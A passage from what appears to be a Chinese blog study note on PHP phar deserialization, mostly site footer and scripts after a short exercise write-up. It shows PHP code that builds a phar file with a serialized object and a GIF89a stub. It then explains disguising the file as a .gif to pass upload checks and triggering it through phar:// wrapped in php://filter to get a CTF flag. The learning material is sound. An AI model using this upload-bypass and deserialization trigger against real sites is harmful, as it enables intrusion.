+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;a.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="keyword">new</span> <span class="title class_">Flag</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;hi2&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里<strong>修改文件开头防止检查</strong>，下载下来，修改后缀为.gif，再上传</p>
+<p>但是会发现依旧在计算哈希值，没有触发hash.php里的代码，原因是需要<strong>使用phar:&#x2F;&#x2F;协议触发</strong>，但是又有检测，所以我们稍微绕过，这里我选择的php:&#x2F;&#x2F;filter协议</p>
+<p>得到flag</p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/8.png" class="" title="图片正常显示了喵~">
+
+
+    </div>
+    <footer class="article-footer">
+        <a data-aos="zoom-in" href="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/#comments" class="article-comment-link">
+          <span class="post-comments-count valine-comment-count" data-xid="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/" itemprop="commentCount"></span>
+          Comments
+        </a>
+        <span data-aos="zoom-in" id="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/" class="leancloud_visitors article-visitor-link" data-flag-title="web学习笔记之phar反序列化喵">
+          <span class="leancloud-visitors-count">0</span>
+          <em class="post-meta-item-text">Readings</em>
+        </span>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag" title="Web安全">Web安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="phar反序列化">phar反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="反序列化">反序列化</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+          <img data-src="https://d-sketon.top/img/_backwebp/bg1.webp" data-sizes="auto" alt="Hello World" class="lazyload">
+      <a href="/2026/02/28/hello-world/" aria-label="Next: Hello World"  title="Next: Hello World"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          Hello World
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="valine">
+              <span>valine</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+        <div class="comment valine-comment" data-aos="fade-up"
+          id="valine-comment">
+        </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+      <span class="footer-info-sep rotate"></span>
+      Gloria
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        27.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:07
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5"><span class="toc-number">1.</span> <span class="toc-text">Web学习笔记之phar反序列化喵~</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%98%AF%E4%BB%80%E4%B9%88%E5%96%B5%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">phar是什么喵？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-0%E6%A0%97%E5%AD%90%E6%A2%A8%E5%AD%90%E6%9D%8E%E5%AD%90%E5%96%B5%E2%9E%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.0栗子梨子李子喵➡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AF%BB%E5%8F%96phar%E6%96%87%E4%BB%B6%E6%97%B6%EF%BC%8C%E5%8F%AF%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">在读取phar文件时，可触发反序列化的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">phar绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-0%E4%BE%8B%E9%A2%98%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.0例题喵喵喵</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+      window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+    }
+  </script>
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Gloria",
+          title: "web学习笔记之phar反序列化喵",
+          url: "http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/",
+          excerpt: "",
+          description: "",
+          stripContent: "Web学习笔记之phar反序列化喵~[TOC] 是的，没错，我又在补作业……（心虚ing） phar是什么喵？phar文件是php里面一种打包文件（类似压缩包），在PHP5.3及更高版本默认开启，意思就是我们可以读取phar文件 如果要生成和使用phar文件时，是通过php代码来生成phar文件的， 在php.ini中需要设置phar.readonly=Off 生成phar文件代码类似如下： 123456789&amp;lt;?php$phar = new Phar(&amp;#x27;a.phar&amp;#x27;",
+          date: "Sat Feb 28 2026 20:57:21 GMT+0800",
+          updated: "Sun Mar 01 2026 16:23:25 GMT+0800",
+          cover: "/images/19.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+        
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["valine"];
+  var commentConfig = {
+    valine: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        if (container.style.display === 'block') return; // already loaded
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/valine@1.5.1/dist/Valine.min.js',
+          'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE+s5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn'
+        );
+        script.onload = () => {
+          var GUEST_INFO = ['nick', 'mail', 'link'];
+          var guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          var recordIP = JSON.parse('true');
+          var highlight = JSON.parse('true');
+          var visitor = JSON.parse('true');
+          var serverURLs = undefined;
+
+          if (window.Valine) {
+            new Valine({
+              el: '.valine-comment',
+              appId: "kvVONbiLMyDuTRiZvZ1bTwdK-gzGzoHsz",
+              appKey: "3n0P97K1hXTVGGSYeh03GY57",
+              placeholder: "说点什么喵",
+              pageSize: '10',
+              avatar: 'mp',
+              lang: document.documentElement.lang || 'en',
+              recordIP: recordIP,
+              highlight: highlight,
+              visitor: visitor,
+              requiredFields: guest_info,
+              path: window.location.pathname,
+              serverURLs
+            });
+          }
+        };
+        document.head.appendChild(script);
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+  </body>
+  </html>
